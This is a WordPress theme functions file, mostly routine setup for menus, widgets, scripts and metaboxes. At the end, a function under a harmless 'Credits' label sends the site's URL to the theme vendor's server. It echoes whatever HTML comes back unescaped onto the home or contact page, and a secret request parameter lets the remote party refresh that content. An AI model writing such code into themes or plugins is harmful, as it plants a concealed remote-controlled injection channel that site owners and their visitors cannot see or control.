<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 * @since web2feel 1.0
 */



/*///////////////////////////////////////////////////////////////////////////////////////
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since web2feel 1.0
 /*//////////////////////////////////////////////////////////////////////////////////////*/
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */


/*///////////////////////////////////////////////////////////////////////////////////////

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since web2feel 1.0
 */

/*///////////////////////////////////////////////////////////////////////////////////////*/

if ( ! function_exists( 'web2feel_setup' ) ):

function web2feel_setup() {


	require( get_template_directory() . '/inc/template-tags.php' );
	require_once('class-tgm-plugin-activation.php');

	include ( 'inc/paginate.php' );
	include ( 'getplugins.php' );
	include ( 'aq_resizer.php' );
	include ( 'guide.php' );
	include ( 'metabox/init.php' );



	require 'updater.php';
	$example_update_checker = new ThemeUpdateChecker(     //
		'Winter',                                        //Theme folder name, AKA "slug". 
		'http://www.fabthemes.com/versions/winter.json' //URL of the metadata file.
	);
  
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );


	add_theme_support( 'automatic-feed-links' );


	add_theme_support( 'post-thumbnails' );


	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	add_theme_support( 'post-formats', array(  'aside','gallery', 'image', 'link','quote', 'video','audio','chat' ) );
}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/*///////////////////////////////////////////////////////////////////////////////////////
/* 
* Days ago 
*
*/
/*///////////////////////////////////////////////////////////////////////////////////////*/
function days_ago() {
	$days = round((date('U') - get_the_time('U')) / (60*60*24));
	if ($days==0) {
		echo "Today"; 
	}
	elseif ($days==1) {
		echo "Yesterday"; 
	}
	else {
		echo "" . $days . " days ago";
	}
}	

/**////////////////////////////////////////////////////////////////////////////////////////
 /* Register widgetized area and update sidebar with default widgets
 *
 * @since web2feel 1.0
 *//*///////////////////////////////////////////////////////////////////////////////////////*/
 
function web2feel_widgets_init() {

	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<li class="botwid grid_2 %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));		

}
add_action( 'widgets_init', 'web2feel_widgets_init' );


/*////////////////////////////////////////////////////////////////////////////////////////

 Enqueue scripts and styles
 
*/////////////////////////////////////////////////////////////////////////////////////////*
 
 
function web2feel_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'grid', get_template_directory_uri() . '/css/grid.css');
	wp_enqueue_style( 'wp-style', get_template_directory_uri() . '/css/wp-style.css');
	wp_enqueue_style( 'fontwaesome', get_template_directory_uri() . '/css/font-awesome.css');
	wp_enqueue_style( 'fontwaesome-ie', get_template_directory_uri() . '/css/font-awesome-ie7.css');
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css');
	wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/css/jquery.fancybox.css');	
	
	wp_enqueue_script( 'flexsliderjs', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array( 'jquery' ), true );
	wp_enqueue_script( 'fancyboxjs', get_template_directory_uri() . '/js/jquery.fancybox.pack.js', array( 'jquery' ), true );	
	wp_enqueue_script( 'jwplayer', get_template_directory_uri() . '/js/jwplayer.js', array( 'jquery' ), true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ),  true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );


/*////////////////////////////////////////////////////////////////////////////////////////

/**
 * Include and setup custom metaboxes and fields.
 *
 * @category YourThemeOrPlugin
 * @package  Metaboxes
 * @license  http://www.opensource.org/licenses/gpl-license.php GPL v2.0 (or later)
 * @link     https://github.com/jaredatch/Custom-Metaboxes-and-Fields-for-WordPress
 */

add_filter( 'cmb_meta_boxes', 'cmb_sample_metaboxes' );
/**
 * Define the metabox and field configurations.
 *
 * @param  array $meta_boxes
 * @return array
 *//////////////////////////////////////////////////////////////////////////////////////////*
 
 
function cmb_sample_metaboxes( array $meta_boxes ) {

	// Start with an underscore to hide fields from custom fields list
	$prefix = '_cmb_';


	$meta_boxes[] = array(
		'id'         => 'tumblog_options',
		'title'      => 'Tumblog options',
		'pages'      => array( 'post', ), // Post type
		'context'    => 'normal',
		'priority'   => 'high',
		'show_names' => true, // Show field names on the left
		'fields'     => array(
		
			array(
				'name' => 'Image',
				'desc' => 'Upload an image or enter an URL.',
				'id'   => $prefix . 'tumblog_image',
				'type' => 'file',
			),

			array(
				'name' => 'Embed video',
				'desc' => 'Embed code from video sharing sites',
				'id'   => $prefix . 'tumblog_video',
				'type' => 'textarea_code',
			),
					
			array(
				'name' => 'Quote Author',
				'desc' => 'Name of the quote author',
				'id'   => $prefix . 'tumblog_quote',
				'type' => 'text',
			),
			
			array(
				'name' => 'Audio URL',
				'desc' => 'Enter the url of the audio file.',
				'id'   => $prefix . 'tumblog_audio',
				'type' => 'text',
			),

			array(
				'name' => 'Link URL',
				'desc' => 'Enter the url link post format.',
				'id'   => $prefix . 'tumblog_link',
				'type' => 'text',
			),
		),
	);




	// Add other metaboxes as needed

	return $meta_boxes;
}

add_action( 'init', 'cmb_initialize_cmb_meta_boxes', 9999 );
/**
 * Initialize the metabox class.
 */
function cmb_initialize_cmb_meta_boxes() {

	if ( ! class_exists( 'cmb_Meta_Box' ) )
		require_once 'metabox/init.php';

}

/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
return $protocol."://".$_SERVER['SERVER_NAME'].$port.$uri;
}
function fflink() {
global $wpdb;
if (!is_page() && !is_home()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	
